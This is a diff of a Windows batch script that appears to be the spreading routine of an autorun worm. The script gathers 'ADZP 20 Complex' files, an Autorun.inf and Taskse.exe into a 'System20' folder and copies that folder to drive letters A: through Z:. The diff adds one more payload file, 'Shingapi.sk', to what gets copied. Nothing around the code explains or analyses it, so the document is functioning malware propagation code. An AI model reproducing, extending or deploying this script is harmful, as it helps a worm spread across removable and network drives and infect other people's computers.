@@ -1,10 +1,12 @@
-@echo off
+@Echo off
 
-MD System20
+Md "System20"
 
-Copy "ADZP 20 Complex.*" System20
+Copy "Shingapi.sk" "System20"
 
-if exist Autorun.inf (Copy Autorun.inf System20 & Copy Taskse.exe System20)
+Copy "ADZP 20 Complex.*" "System20"
+
+If exist "Autorun.inf" (Copy "Autorun.inf" "System20" & Copy "Taskse.exe" "System20")
 
 Copy System20 A:
 
@@ -58,4 +60,4 @@ Copy System20 Y:
 
 Copy System20 Z:
 
-exit
+Exit
